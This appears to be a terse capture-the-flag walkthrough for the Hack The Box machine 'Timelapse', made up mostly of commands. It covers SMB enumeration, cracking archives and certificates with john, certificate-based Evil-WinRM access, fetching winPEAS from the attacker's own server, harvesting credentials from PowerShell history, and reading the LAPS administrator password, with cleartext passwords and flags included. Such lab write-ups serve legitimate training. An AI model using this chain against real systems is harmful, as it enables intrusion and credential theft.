```
dig any @timelapse.htb timelapse.htb

nmap -sT -Pn -n --open timelapse.htb -p389 --script ldap-rootdse
smbclient -L //timelapse.htb
smbclient //timelapse.htb/Shares

john to crack passwords (both zip and pfx with rockyou.txt)

openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out timelapse.key
openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out timelapse.crt
openssl rsa -in timelapse.key -out private.key


sudo docker run --rm -ti --name evil-winrm \
-v /home/jello/evil_winrm/ps1_scripts:/ps1_scripts \
-v /home/jello/evil-winrm/exe_files:/exe_files \
-v /home/jello/evil-winrm/data:/data \
oscarakaelvis/evil-winrm -s '/ps1_scripts/' -e '/exe_files/' \
-S -k /data/private.key -c /data/timelapse.crt -i 10.129.227.105


Connected as legacy
user.txt >> ae14c246434264384409cda24a17e779

python3 -m http.server 80 in ~/privesc folder

Invoke-WebRequest -Uri http://10.10.14.95/winPEASx64.exe -OutFile "C:\\Users\\legacyy\\Downloads\\winPEASx64.exe"

use winpeas .. consolehost_history.txt

svc_deploy:E3R$Q62^12p7PLlC%KWaxuaV

sudo docker run --rm -ti --name evil-winrm \
-v /home/jello/evil_winrm/ps1_scripts:/ps1_scripts \
-v /home/jello/evil-winrm/exe_files:/exe_files \
-v /home/jello/evil-winrm/data:/data \
oscarakaelvis/evil-winrm -s '/ps1_scripts/' -e '/exe_files/' \
-S -u 'svc_deploy' -p 'E3R$Q62^12p7PLlC%KWaxuaV' -i 10.129.227.105

under LAPS_READER group .. meaning svc_deploy can read the local administrator password solution from ldap

Get-ADComputer -Filter 'ObjectClass -eq "Computer"' -Properties *

sudo docker run --rm -ti --name evil-winrm \
-v /home/jello/evil_winrm/ps1_scripts:/ps1_scripts \
-v /home/jello/evil-winrm/exe_files:/exe_files \
-v /home/jello/evil-winrm/data:/data \
oscarakaelvis/evil-winrm -s '/ps1_scripts/' -e '/exe_files/' \
-S -u 'Administrator' -p '8,(m(T(-GjF1!50Dq{i0rOX4' -i 10.129.227.105

Get-Childitem -Path C:\Users -Recurse "root.txt"

root.txt >> eb8624162b115a7d682b79b53c9f9d14
```